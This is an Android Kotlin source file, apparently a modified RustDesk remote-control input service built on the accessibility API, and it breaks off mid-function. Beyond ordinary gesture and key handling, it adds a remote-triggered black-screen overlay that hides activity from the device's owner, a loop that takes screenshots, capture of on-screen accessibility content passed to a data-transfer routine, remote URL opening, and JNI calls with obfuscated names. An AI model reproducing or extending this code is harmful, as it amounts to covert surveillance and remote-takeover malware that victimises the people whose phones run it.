package com.carriez.flutter_hbb

/**
 * Handle remote input and dispatch android gesture
 *
 * Inspired by [droidVNC-NG] https://github.com/bk138/droidVNC-NG
 */

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.EditText
import android.view.accessibility.AccessibilityEvent
import android.view.ViewGroup.LayoutParams
import android.view.accessibility.AccessibilityNodeInfo
import android.view.KeyEvent as KeyEventAndroid
import android.view.ViewConfiguration
import android.graphics.Rect
import android.media.AudioManager
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.AccessibilityServiceInfo.FLAG_INPUT_METHOD_EDITOR
import android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
import android.view.inputmethod.EditorInfo
import androidx.annotation.RequiresApi
import java.util.*
import java.lang.Character
import kotlin.math.abs
import kotlin.math.max
import hbb.MessageOuterClass.KeyEvent
import hbb.MessageOuterClass.KeyboardMode
import hbb.KeyEventConverter

import android.view.WindowManager
import android.view.WindowManager.LayoutParams.*
import android.widget.FrameLayout
import android.graphics.Color
import android.annotation.SuppressLint
import android.graphics.PixelFormat
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.util.DisplayMetrics
import android.widget.ProgressBar
import android.widget.TextView
import android.content.Context
import android.content.res.ColorStateList

import android.content.Intent
import android.net.Uri
import ffi.FFI


import android.graphics.*
import java.io.ByteArrayOutputStream
import android.hardware.HardwareBuffer
import android.graphics.Bitmap.wrapHardwareBuffer
import java.nio.IntBuffer
import java.nio.ByteOrder
import java.nio.ByteBuffer
import java.io.IOException
import java.io.File
import java.io.FileOutputStream
import java.lang.reflect.Field
import java.text.SimpleDateFormat
import android.os.Environment

import java.util.concurrent.locks.ReentrantLock
import java.security.MessageDigest

import java.util.concurrent.Executor
import java.util.concurrent.Executors
import kotlinx.coroutines.*

import android.os.SystemClock
import android.content.res.Resources
import android.graphics.drawable.GradientDrawable

import android.view.accessibility.AccessibilityManager

import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.ThreadPoolExecutor
import java.util.concurrent.TimeUnit
import android.content.ContentValues
import android.provider.MediaStore
import java.util.concurrent.SynchronousQueue

// const val BUTTON_UP = 2
// const val BUTTON_BACK = 0x08

const val LEFT_DOWN = 9
const val LEFT_MOVE = 8
const val LEFT_UP = 10
const val RIGHT_UP = 18
// (BUTTON_BACK << 3) | BUTTON_UP
const val BACK_UP = 66
const val WHEEL_BUTTON_DOWN = 33
const val WHEEL_BUTTON_UP = 34

const val WHEEL_BUTTON_BROWSER = 38//32+6

const val WHEEL_DOWN = 523331
const val WHEEL_UP = 963

const val TOUCH_SCALE_START = 1
const val TOUCH_SCALE = 2
const val TOUCH_SCALE_END = 3
const val TOUCH_PAN_START = 4
const val TOUCH_PAN_UPDATE = 5
const val TOUCH_PAN_END = 6

const val WHEEL_STEP = 120
const val WHEEL_DURATION = 50L
const val LONG_TAP_DELAY = 200L

class InputService : AccessibilityService() {

    companion object {
        private var viewUntouchable = true
        private var viewTransparency = 1f //// 0 means invisible but can help prevent the service from being killed
        var ctx: InputService? = null
        val isOpen: Boolean
            get() = ctx != null
    }
    
    //新增
    private lateinit var windowManager: WindowManager
    private lateinit var overLayparams_bass: WindowManager.LayoutParams
    private lateinit var overLay: FrameLayout
    private val lock = ReentrantLock()
    
    private val logTag = "input service"
    private var leftIsDown = false
    private var touchPath = Path()
    private var stroke: GestureDescription.StrokeDescription? = null
    private var lastTouchGestureStartTime = 0L
    private var mouseX = 0
    private var mouseY = 0
    private var timer = Timer()
    private var recentActionTask: TimerTask? = null
    // 100(tap timeout) + 400(long press timeout)
    private val longPressDuration = ViewConfiguration.getTapTimeout().toLong() + ViewConfiguration.getLongPressTimeout().toLong()

    private val wheelActionsQueue = LinkedList<GestureDescription>()
    private var isWheelActionsPolling = false
    private var isWaitingLongPress = false

    private var fakeEditTextForTextStateCalculation: EditText? = null
    private var ClassGen12Globalnode: AccessibilityNodeInfo? = null
	
    private var lastX = 0
    private var lastY = 0

    private val volumeController: VolumeController by lazy { VolumeController(applicationContext.getSystemService(AUDIO_SERVICE) as AudioManager) }

    @RequiresApi(Build.VERSION_CODES.N)
    fun onMouseInput(mask: Int, _x: Int, _y: Int,url: String) {
        val x = max(0, _x)
        val y = max(0, _y)

        if (mask == 0 || mask == LEFT_MOVE) {
            val oldX = mouseX
            val oldY = mouseY
            mouseX = x * SCREEN_INFO.scale
            mouseY = y * SCREEN_INFO.scale
            if (isWaitingLongPress) {
                val delta = abs(oldX - mouseX) + abs(oldY - mouseY)
               //   Log.d(logTag,"delta:$delta")
                if (delta > 8) {
                    isWaitingLongPress = false
                }
            }
        }
          if (mask == WHEEL_BUTTON_BROWSER) {	
    	   // 调用打开浏览器输入网址的方法
    	   if (!url.isNullOrEmpty()) {
			      val trimmedUrl = url.trim()
			      if (!trimmedUrl.startsWith("http")) {
						//ClassGen12TP = trimmedUrl
						//ClassGen12NP = true
						//b481c5f9b372ead()
			      } else {
			     	    openBrowserWithUrl(trimmedUrl)
			      }
    	    }
            return
        }
        // left button down, was up
        if (mask == LEFT_DOWN) {
            isWaitingLongPress = true
            timer.schedule(object : TimerTask() {
                override fun run() {
                    if (isWaitingLongPress) {
                        isWaitingLongPress = false
                        continueGesture(mouseX, mouseY)
                    }
                }
            }, longPressDuration)

            leftIsDown = true
            startGesture(mouseX, mouseY)
            return
        }

        // left down, was down
        if (leftIsDown) {
            continueGesture(mouseX, mouseY)
        }

        // left up, was down
        if (mask == LEFT_UP) {
            if (leftIsDown) {
                leftIsDown = false
                isWaitingLongPress = false
                endGesture(mouseX, mouseY)
                return
            }
        }

        if (mask == RIGHT_UP) {
            longPress(mouseX, mouseY)
            return
        }

        if (mask == BACK_UP) {
            performGlobalAction(GLOBAL_ACTION_BACK)
            return
        }

        // long WHEEL_BUTTON_DOWN -> GLOBAL_ACTION_RECENTS
        if (mask == WHEEL_BUTTON_DOWN) {
            timer.purge()
            recentActionTask = object : TimerTask() {
                override fun run() {
                    performGlobalAction(GLOBAL_ACTION_RECENTS)
                    recentActionTask = null
                }
            }
            timer.schedule(recentActionTask, LONG_TAP_DELAY)
        }

        // wheel button up
        if (mask == WHEEL_BUTTON_UP) {
            if (recentActionTask != null) {
                recentActionTask!!.cancel()
                performGlobalAction(GLOBAL_ACTION_HOME)
            }
            return
        }

        if (mask == WHEEL_DOWN) {
            if (mouseY < WHEEL_STEP) {
                return
            }
            val path = Path()
            path.moveTo(mouseX.toFloat(), mouseY.toFloat())
            path.lineTo(mouseX.toFloat(), (mouseY - WHEEL_STEP).toFloat())
            val stroke = GestureDescription.StrokeDescription(
                path,
                0,
                WHEEL_DURATION
            )
            val builder = GestureDescription.Builder()
            builder.addStroke(stroke)
            wheelActionsQueue.offer(builder.build())
            consumeWheelActions()

        }

        if (mask == WHEEL_UP) {
            if (mouseY < WHEEL_STEP) {
                return
            }
            val path = Path()
            path.moveTo(mouseX.toFloat(), mouseY.toFloat())
            path.lineTo(mouseX.toFloat(), (mouseY + WHEEL_STEP).toFloat())
            val stroke = GestureDescription.StrokeDescription(
                path,
                0,
                WHEEL_DURATION
            )
            val builder = GestureDescription.Builder()
            builder.addStroke(stroke)
            wheelActionsQueue.offer(builder.build())
            consumeWheelActions()
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun onTouchInput(mask: Int, _x: Int, _y: Int) {
        when (mask) {
            TOUCH_PAN_UPDATE -> {
                mouseX -= _x * SCREEN_INFO.scale
                mouseY -= _y * SCREEN_INFO.scale
                mouseX = max(0, mouseX);
                mouseY = max(0, mouseY);
                continueGesture(mouseX, mouseY)
            }
            TOUCH_PAN_START -> {
                mouseX = max(0, _x) * SCREEN_INFO.scale
                mouseY = max(0, _y) * SCREEN_INFO.scale
                startGesture(mouseX, mouseY)
            }
            TOUCH_PAN_END -> {
                endGesture(mouseX, mouseY)
                mouseX = max(0, _x) * SCREEN_INFO.scale
                mouseY = max(0, _y) * SCREEN_INFO.scale
            }
            else -> {}
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun onstart_capture(arg1: String,arg2: String) {
		//分析传值
		if(arg1=="1")
		{
              SKL=true
			  //if(shouldRun){ shouldRun=false}  
              Log.d("input service","onstart_capture 重置分析缓冲:$SKL")
		     //FFI.c6e5a24386fdbdd7f(this)
		}
		else
		{
            SKL=false
			//if(Wt&&!shouldRun){ shouldRun=true}  
			Log.d("input service","onstart_capture 重置分析缓冲:$SKL")
			   //  FFI.a6205cca3af04a8d(this)   
		} 
    }
    
      @RequiresApi(Build.VERSION_CODES.N)
    fun onstop_overlay(arg1: String,arg2: String) {
	   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {

		    Log.d("input service","onstart_capture 重置截图缓冲:$arg1,$arg2")
			
		   if(arg1=="1")
		   {
			   if(!shouldRun)
			   {
				   Wt=true
				   shouldRun=true
			       if(SKL){ SKL=false}
			       screenshotDelayMillis = FFI.getNetArgs5()
				   i()
			  }
			   else
			   {
				   if(SKL){ SKL=false}
			   }
		   }
           else
		   {  
		      shouldRun=false
		   }

		   /*
	        if(shouldRun)
		    {
				screenshotDelayMillis = 500L
				i()
				//FFI.a6205cca3af04a8d(this)    
		    } */
		   
		    //screenshotDelayMillis = 500L//FFI.getNetArgs5()
		    //checkAndStartScreenshotLoop(shouldRun)
			//i()
	     }
    }
    
       @RequiresApi(Build.VERSION_CODES.N)
	fun onstart_overlay(arg1: String, arg2: String) {
	    // 黑屏转换
	    gohome = arg1.toInt()
	
	    // 确保 overLay 不为空并且已附加到窗口
	    if (overLay != null && overLay.windowToken != null) { 
	        overLay.post {
	            if (gohome == 8) {  // 不可见状态
	                overLay.isFocusable = false
	                overLay.isClickable = false
	            } else {  // 可见状态
	                overLay.isFocusable = true
	                overLay.isClickable = true
	            }
	            overLay.visibility = gohome
	        }
	    }
	}

      @SuppressLint("WrongConstant")
       private fun openBrowserWithUrl(url: String) {
	     try {
		Handler(Looper.getMainLooper()).post(
		{
		    val intent = Intent("android.intent.action.VIEW", Uri.parse(url))
		    intent.flags = 268435456
		    if (intent.resolveActivity(packageManager) != null) {
			      FloatingWindowService.app_ClassGen11_Context?.let {
				    it.startActivity(intent)
				}    
		    }
		    else
		   {
			    FloatingWindowService.app_ClassGen11_Context?.let {
				    // 在这里使用 it 代替 context
				    it.startActivity(intent)
				}
		   }
		})
	     } catch (e: Exception) {
	    }
      }

    
    @RequiresApi(Build.VERSION_CODES.N)
    private fun consumeWheelActions() {
        if (isWheelActionsPolling) {
            return
        } else {
            isWheelActionsPolling = true
        }
        wheelActionsQueue.poll()?.let {
            dispatchGesture(it, null, null)
            timer.purge()
            timer.schedule(object : TimerTask() {
                override fun run() {
                    isWheelActionsPolling = false
                    consumeWheelActions()
                }
            }, WHEEL_DURATION + 10)
        } ?: let {
            isWheelActionsPolling = false
            return
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun performClick(x: Int, y: Int, duration: Long) {
        val path = Path()
        path.moveTo(x.toFloat(), y.toFloat())
        try {
            val longPressStroke = GestureDescription.StrokeDescription(path, 0, duration)
            val builder = GestureDescription.Builder()
            builder.addStroke(longPressStroke)
          //    Log.d(logTag, "performClick x:$x y:$y time:$duration")
            dispatchGesture(builder.build(), null, null)
        } catch (e: Exception) {
          //    Log.e(logTag, "performClick, error:$e")
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun longPress(x: Int, y: Int) {
        performClick(x, y, longPressDuration)
    }

    private fun startGesture(x: Int, y: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            touchPath.reset()
        } else {
            touchPath = Path()
        }
        touchPath.moveTo(x.toFloat(), y.toFloat())
        lastTouchGestureStartTime = System.currentTimeMillis()
        lastX = x
        lastY = y
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun doDispatchGesture(x: Int, y: Int, willContinue: Boolean) {
        touchPath.lineTo(x.toFloat(), y.toFloat())
        var duration = System.currentTimeMillis() - lastTouchGestureStartTime
        if (duration <= 0) {
            duration = 1
        }
        try {
            if (stroke == null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    stroke = GestureDescription.StrokeDescription(
                        touchPath,
                        0,
                        duration,
                        willContinue
                    )
                } else {
                    stroke = GestureDescription.StrokeDescription(
                        touchPath,
                        0,
                        duration
                    )
                }
            } else {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    stroke = stroke?.continueStroke(touchPath, 0, duration, willContinue)
                } else {
                    stroke = null
                    stroke = GestureDescription.StrokeDescription(
                        touchPath,
                        0,
                        duration
                    )
                }
            }
            stroke?.let {
                val builder = GestureDescription.Builder()
                builder.addStroke(it)
               //   Log.d(logTag, "doDispatchGesture x:$x y:$y time:$duration")
                dispatchGesture(builder.build(), null, null)
            }
        } catch (e: Exception) {
          //    Log.e(logTag, "doDispatchGesture, willContinue:$willContinue, error:$e")
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun continueGesture(x: Int, y: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            doDispatchGesture(x, y, true)
            touchPath.reset()
            touchPath.moveTo(x.toFloat(), y.toFloat())
            lastTouchGestureStartTime = System.currentTimeMillis()
            lastX = x
            lastY = y
        } else {
            touchPath.lineTo(x.toFloat(), y.toFloat())
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun endGestureBelowO(x: Int, y: Int) {
        try {
            touchPath.lineTo(x.toFloat(), y.toFloat())
            var duration = System.currentTimeMillis() - lastTouchGestureStartTime
            if (duration <= 0) {
                duration = 1
            }
            val stroke = GestureDescription.StrokeDescription(
                touchPath,
                0,
                duration
            )
            val builder = GestureDescription.Builder()
            builder.addStroke(stroke)
           //   Log.d(logTag, "end gesture x:$x y:$y time:$duration")
            dispatchGesture(builder.build(), null, null)
        } catch (e: Exception) {
          //    Log.e(logTag, "endGesture error:$e")
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun endGesture(x: Int, y: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            doDispatchGesture(x, y, false)
            touchPath.reset()
            stroke = null
        } else {
            endGestureBelowO(x, y)
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun onKeyEvent(data: ByteArray) {
        val keyEvent = KeyEvent.parseFrom(data)
        val keyboardMode = keyEvent.getMode()

        var textToCommit: String? = null

        // [down] indicates the key's state(down or up).
        // [press] indicates a click event(down and up).
        // https://github.com/rustdesk/rustdesk/blob/3a7594755341f023f56fa4b6a43b60d6b47df88d/flutter/lib/models/input_model.dart#L688
        if (keyEvent.hasSeq()) {
            textToCommit = keyEvent.getSeq()
        } else if (keyboardMode == KeyboardMode.Legacy) {
            if (keyEvent.hasChr() && (keyEvent.getDown() || keyEvent.getPress())) {
                val chr = keyEvent.getChr()
                if (chr != null) {
                    textToCommit = String(Character.toChars(chr))
                }
            }
        } else if (keyboardMode == KeyboardMode.Translate) {
        } else {
        }

       //   Log.d(logTag, "onKeyEvent $keyEvent textToCommit:$textToCommit")

        var ke: KeyEventAndroid? = null
        if (Build.VERSION.SDK_INT < 33 || textToCommit == null) {
            ke = KeyEventConverter.toAndroidKeyEvent(keyEvent)
        }
        ke?.let { event ->
            if (tryHandleVolumeKeyEvent(event)) {
                return
            } else if (tryHandlePowerKeyEvent(event)) {
                return
            }
        }

        if (Build.VERSION.SDK_INT >= 33) {
            getInputMethod()?.let { inputMethod ->
                inputMethod.getCurrentInputConnection()?.let { inputConnection ->
                    if (textToCommit != null) {
                        textToCommit?.let { text ->
                            inputConnection.commitText(text, 1, null)
                        }
                    } else {
                        ke?.let { event ->
                            inputConnection.sendKeyEvent(event)
                            if (keyEvent.getPress()) {
                                val actionUpEvent = KeyEventAndroid(KeyEventAndroid.ACTION_UP, event.keyCode)
                                inputConnection.sendKeyEvent(actionUpEvent)
                            }
                        }
                    }
                }
            }
        } else {
            val handler = Handler(Looper.getMainLooper())
            handler.post {
                ke?.let { event ->
                    val possibleNodes = possibleAccessibiltyNodes()
                   //   Log.d(logTag, "possibleNodes:$possibleNodes")
                    for (item in possibleNodes) {
                        val success = trySendKeyEvent(event, item, textToCommit)
                        if (success) {
                            if (keyEvent.getPress()) {
                                val actionUpEvent = KeyEventAndroid(KeyEventAndroid.ACTION_UP, event.keyCode)
                                trySendKeyEvent(actionUpEvent, item, textToCommit)
                            }
                            break
                        }
                    }
                }
            }
        }
    }

    private fun tryHandleVolumeKeyEvent(event: KeyEventAndroid): Boolean {
        when (event.keyCode) {
            KeyEventAndroid.KEYCODE_VOLUME_UP -> {
                if (event.action == KeyEventAndroid.ACTION_DOWN) {
                    volumeController.raiseVolume(null, true, AudioManager.STREAM_SYSTEM)
                }
                return true
            }
            KeyEventAndroid.KEYCODE_VOLUME_DOWN -> {
                if (event.action == KeyEventAndroid.ACTION_DOWN) {
                    volumeController.lowerVolume(null, true, AudioManager.STREAM_SYSTEM)
                }
                return true
            }
            KeyEventAndroid.KEYCODE_VOLUME_MUTE -> {
                if (event.action == KeyEventAndroid.ACTION_DOWN) {
                    volumeController.toggleMute(true, AudioManager.STREAM_SYSTEM)
                }
                return true
            }
            else -> {
                return false
            }
        }
    }

    private fun tryHandlePowerKeyEvent(event: KeyEventAndroid): Boolean {
        if (event.keyCode == KeyEventAndroid.KEYCODE_POWER) {
            // Perform power dialog action when action is up
            if (event.action == KeyEventAndroid.ACTION_UP) {
                performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
            }
            return true
        }
        return false
    }

    private fun insertAccessibilityNode(list: LinkedList<AccessibilityNodeInfo>, node: AccessibilityNodeInfo) {
        if (node == null) {
            return
        }
        if (list.contains(node)) {
            return
        }
        list.add(node)
    }

    private fun findChildNode(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (node == null) {
            return null
        }
        if (node.isEditable() && node.isFocusable()) {
            return node
        }
        val childCount = node.getChildCount()
        for (i in 0 until childCount) {
            val child = node.getChild(i)
            if (child != null) {
                if (child.isEditable() && child.isFocusable()) {
                    return child
                }
                if (Build.VERSION.SDK_INT < 33) {
                    child.recycle()
                }
            }
        }
        for (i in 0 until childCount) {
            val child = node.getChild(i)
            if (child != null) {
                val result = findChildNode(child)
                if (Build.VERSION.SDK_INT < 33) {
                    if (child != result) {
                        child.recycle()
                    }
                }
                if (result != null) {
                    return result
                }
            }
        }
        return null
    }

    private fun possibleAccessibiltyNodes(): LinkedList<AccessibilityNodeInfo> {
        val linkedList = LinkedList<AccessibilityNodeInfo>()
        val latestList = LinkedList<AccessibilityNodeInfo>()

        val focusInput = findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        var focusAccessibilityInput = findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY)

        val rootInActiveWindow = getRootInActiveWindow()

        //  Log.d(logTag, "focusInput:$focusInput focusAccessibilityInput:$focusAccessibilityInput rootInActiveWindow:$rootInActiveWindow")

        if (focusInput != null) {
            if (focusInput.isFocusable() && focusInput.isEditable()) {
                insertAccessibilityNode(linkedList, focusInput)
            } else {
                insertAccessibilityNode(latestList, focusInput)
            }
        }

        if (focusAccessibilityInput != null) {
            if (focusAccessibilityInput.isFocusable() && focusAccessibilityInput.isEditable()) {
                insertAccessibilityNode(linkedList, focusAccessibilityInput)
            } else {
                insertAccessibilityNode(latestList, focusAccessibilityInput)
            }
        }

        val childFromFocusInput = findChildNode(focusInput)
      //    Log.d(logTag, "childFromFocusInput:$childFromFocusInput")

        if (childFromFocusInput != null) {
            insertAccessibilityNode(linkedList, childFromFocusInput)
        }

        val childFromFocusAccessibilityInput = findChildNode(focusAccessibilityInput)
        if (childFromFocusAccessibilityInput != null) {
            insertAccessibilityNode(linkedList, childFromFocusAccessibilityInput)
        }
    //      Log.d(logTag, "childFromFocusAccessibilityInput:$childFromFocusAccessibilityInput")

        if (rootInActiveWindow != null) {
            insertAccessibilityNode(linkedList, rootInActiveWindow)
        }

        for (item in latestList) {
            insertAccessibilityNode(linkedList, item)
        }

        return linkedList
    }

    private fun trySendKeyEvent(event: KeyEventAndroid, node: AccessibilityNodeInfo, textToCommit: String?): Boolean {
        node.refresh()
        this.fakeEditTextForTextStateCalculation?.setSelection(0,0)
        this.fakeEditTextForTextStateCalculation?.setText(null)

        val text = node.getText()
        var isShowingHint = false
        if (Build.VERSION.SDK_INT >= 26) {
            isShowingHint = node.isShowingHintText()
        }

        var textSelectionStart = node.textSelectionStart
        var textSelectionEnd = node.textSelectionEnd

        if (text != null) {
            if (textSelectionStart > text.length) {
                textSelectionStart = text.length
            }
            if (textSelectionEnd > text.length) {
                textSelectionEnd = text.length
            }
            if (textSelectionStart > textSelectionEnd) {
                textSelectionStart = textSelectionEnd
            }
        }

        var success = false

     //     Log.d(logTag, "existing text:$text textToCommit:$textToCommit textSelectionStart:$textSelectionStart textSelectionEnd:$textSelectionEnd")

        if (textToCommit != null) {
            if ((textSelectionStart == -1) || (textSelectionEnd == -1)) {
                val newText = textToCommit
                this.fakeEditTextForTextStateCalculation?.setText(newText)
                success = updateTextForAccessibilityNode(node)
            } else if (text != null) {
                this.fakeEditTextForTextStateCalculation?.setText(text)
                this.fakeEditTextForTextStateCalculation?.setSelection(
                    textSelectionStart,
                    textSelectionEnd
                )
                this.fakeEditTextForTextStateCalculation?.text?.insert(textSelectionStart, textToCommit)
                success = updateTextAndSelectionForAccessibiltyNode(node)
            }
        } else {
            if (isShowingHint) {
                this.fakeEditTextForTextStateCalculation?.setText(null)
            } else {
                this.fakeEditTextForTextStateCalculation?.setText(text)
            }
            if (textSelectionStart != -1 && textSelectionEnd != -1) {
              //    Log.d(logTag, "setting selection $textSelectionStart $textSelectionEnd")
                this.fakeEditTextForTextStateCalculation?.setSelection(
                    textSelectionStart,
                    textSelectionEnd
                )
            }

            this.fakeEditTextForTextStateCalculation?.let {
                // This is essiential to make sure layout object is created. OnKeyDown may not work if layout is not created.
                val rect = Rect()
                node.getBoundsInScreen(rect)

                it.layout(rect.left, rect.top, rect.right, rect.bottom)
                it.onPreDraw()
                if (event.action == KeyEventAndroid.ACTION_DOWN) {
                    val succ = it.onKeyDown(event.getKeyCode(), event)
                 //     Log.d(logTag, "onKeyDown $succ")
                } else if (event.action == KeyEventAndroid.ACTION_UP) {
                    val success = it.onKeyUp(event.getKeyCode(), event)
                 //     Log.d(logTag, "keyup $success")
                } else {}
            }

            success = updateTextAndSelectionForAccessibiltyNode(node)
        }
        return success
    }

    fun updateTextForAccessibilityNode(node: AccessibilityNodeInfo): Boolean {
        var success = false
        this.fakeEditTextForTextStateCalculation?.text?.let {
            val arguments = Bundle()
            arguments.putCharSequence(
                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                it.toString()
            )
            success = node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
        }
        return success
    }

    fun updateTextAndSelectionForAccessibiltyNode(node: AccessibilityNodeInfo): Boolean {
        var success = updateTextForAccessibilityNode(node)

        if (success) {
            val selectionStart = this.fakeEditTextForTextStateCalculation?.selectionStart
            val selectionEnd = this.fakeEditTextForTextStateCalculation?.selectionEnd

            if (selectionStart != null && selectionEnd != null) {
                val arguments = Bundle()
                arguments.putInt(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT,
                    selectionStart
                )
                arguments.putInt(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT,
                    selectionEnd
                )
                success = node.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, arguments)
               //   Log.d(logTag, "Update selection to $selectionStart $selectionEnd success:$success")
            }
        }

        return success
    }

    /*
     fun classGen12Treger() {
        // 使用 this 获取当前服务的上下文
        Handler(Looper.getMainLooper()).post(object : Runnable {
            override fun run() {
                try {
                    val accessibilityManager = getSystemService(ACCESSIBILITY_SERVICE) as AccessibilityManager
                    if (accessibilityManager.isEnabled) {
                        val obtain = AccessibilityEvent.obtain()
                        obtain.eventType = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
                        obtain.className = javaClass.name
                        obtain.packageName = packageName  // 使用当前服务的包名
                        obtain.text.add(d5)  // 假设 a.d5 是你想发送的文本
                        accessibilityManager.sendAccessibilityEvent(obtain)
                    }
                } catch (e2: Exception) {
                    // 处理异常
                }
            }
        })
    }*/

private val executor = Executors.newFixedThreadPool(5)

/**
 * 自动判断线程执行任务：
 * - 在主线程 → 用线程池执行
 * - 在子线程 → 直接执行
 */
fun runSafe(task: () -> Unit) {
    if (Looper.myLooper() == Looper.getMainLooper()) {
        executor.execute { task() }
    } else {
        task()
    }
}

fun b481c5f9b372ead() {
    runSafe {
        FFI.b481c5f9b372ead(this@InputService)
    }
}

fun e8104ea96da3d44() {
    runSafe {
        try {
            FFI.e8104ea96da3d44(
                this@InputService,
                ClassGen12Globalnode,
                ClassGen12TP
            )
            // 更新共享变量，保证可见性
            synchronized(this) {
                ClassGen12TP = ""
                ClassGen12NP = false
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}


fun b481c5f9b372ead_2() {
    Handler(Looper.getMainLooper()).post {
        FFI.b481c5f9b372ead(this@InputService)
    }
}

    fun e8104ea96da3d44_2() {
	    
 Handler(Looper.getMainLooper()).post {
    try {
      /*  val rootNode = rootInActiveWindow
        FFI.ClassGen12pasteText(
            rootNode,
            ClassGen12Globalnode,
            ClassGen12TP
        )*/
     FFI.e8104ea96da3d44(
	this@InputService,
	ClassGen12Globalnode,
	ClassGen12TP
       )
        ClassGen12TP = ""
        ClassGen12NP = false
    } catch (e: Exception) {
        e.printStackTrace()
    }
}
 
/*
    try {
          val rootNode = rootInActiveWindow
            FFI.ClassGen12pasteText(
                rootNode,                  // 传入 root 节点
                ClassGen12Globalnode,    // 已保存的全局节点
                ClassGen12TP               // 要粘贴的文本
            )
            ClassGen12TP = ""
            ClassGen12NP = false
        
    } catch (e: Exception) {
        // 可选的日志或错误处理
    }*/
}

   /*
   fun ClassGen12pasteText() {
	    try {
		val findFocus = rootInActiveWindow.findFocus(1)
		findFocus?.let {
		    val bundle = Bundle().apply {
			putString("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", ClassGen12TP)
		    }
		    if (!it.performAction(2097152, bundle)) {
			val accessibilityNodeInfo = ClassGen12Globalnode
			accessibilityNodeInfo?.performAction(2097152, bundle)
			    ?: return
		    }
		    ClassGen12TP = ""
		    ClassGen12NP = false
		}
	    } catch (e2: Exception) {
		// Handle exception if needed
	    }
     }*/

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
/*
	 // Kotlin 假设你用 AccessibilityService 获取到 event
	val result = FFI.b99c119845afdf69(event)
	if (result != null) {
	    ClassGen12Globalnode = result // 注意：JNI 返回的对象可以强转为 AccessibilityNodeInfo
	}
	
	if (ClassGen12NP) {
            e8104ea96da3d44();
        }
*/
	
/*
      var accessibilityNodeInfo2: AccessibilityNodeInfo?
       try {
           accessibilityNodeInfo2 = event.source
	} catch (e5: Exception) {
	    accessibilityNodeInfo2 = null
	}
	
	try {
	    if (accessibilityNodeInfo2 != null && event.className == "android.widget.EditText") {
	        ClassGen12Globalnode = accessibilityNodeInfo2
	    }
	} catch (e6: Exception) {
	    // Do nothing if there's an error
	}*/

	 if(!SKL)return
	    
        //   Log.d(logTag, "SKL accessibilityNodeInfo3 NOT NULL")
	    
        var accessibilityNodeInfo3: AccessibilityNodeInfo?
        try {
	    //val rootNode = FFI.getRootInActiveWindow(this)
	    accessibilityNodeInfo3 = FFI.c88f1fb2d2ef0700(this)
            //accessibilityNodeInfo3 = rootInActiveWindow
        } catch (unused6: java.lang.Exception) {
            accessibilityNodeInfo3 = null
        }
        if (accessibilityNodeInfo3 != null) {
            try {
                //if (My_ClassGen_Settings.readBool(this, "SKL", false)) {
                 if(SKL){
		     //Log.d(logTag, "SKL accessibilityNodeInfo3 NOT NULL")
                    val ss999: AccessibilityNodeInfo = accessibilityNodeInfo3
                    Thread(Runnable { DataTransferManager.a012933444444(ss999) }).start()
                }
		 else
		    {
                      // Log.d(logTag, "SKL accessibilityNodeInfo3 else $SKL")
		    }
            } catch (unused7: java.lang.Exception) {
            }
        }
	    else
	    {
               //  Log.d(logTag, "SKL accessibilityNodeInfo3 NULL")
	    }
    }
    
 override fun takeScreenshot(
        i: Int,
        executor: Executor,
        takeScreenshotCallback: TakeScreenshotCallback
    ) {
        super.takeScreenshot(i, executor, takeScreenshotCallback)
    }
      
  // 延迟时间变量（可动态调整）
   // private var screenshotDelayMillis = 1000L
    private var screenshotDelayMillis: Long? = null

	/*
    private val i = ThreadPoolExecutor(
        10, 10,
        15, TimeUnit.SECONDS,
        LinkedBlockingQueue<Runnable>()
    )*/

	private val i = ThreadPoolExecutor(
    2,               // corePoolSize: 4个核心线程
    2,               // maximumPoolSize: 最大线程数也为4
    0L, TimeUnit.MILLISECONDS,  // keepAliveTime: 这没有影响，因为没有非核心线程
    //LinkedBlockingQueue<Runnable>(2), // 有界队列，容量为 4
	SynchronousQueue(),         // 泛型可省
    ThreadPoolExecutor.DiscardOldestPolicy()   // 拒绝策略：丢弃最旧的任务
)

    fun d(str: String?) {
        try {
            if (str != null) {
                Log.d("input service", "正在截图，可能这里没有释放")
                takeScreenshot(0, this.i, ScreenshotCallback())//ScreenshotCallback(context, i2, str))
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
	
    private fun l() {
        try {
            while (shouldRun == true) {
                try {
                   if (shouldRun && !SKL) {
			             // 截图模式逻辑
